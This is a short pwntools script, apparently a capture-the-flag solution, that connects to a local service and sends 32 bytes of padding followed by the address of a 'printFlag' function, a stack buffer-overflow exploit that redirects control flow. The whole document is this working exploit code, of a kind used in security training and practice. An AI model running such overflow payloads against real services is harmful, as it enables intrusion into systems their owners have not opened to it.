from pwn import *

conn = remote('127.0.0.1','9000')

payload = "A"*32

mem_buf   = 0x08049f14
printFlag = 0x0804861d

payload += p32(printFlag)

conn.send(payload)

conn.interactive()


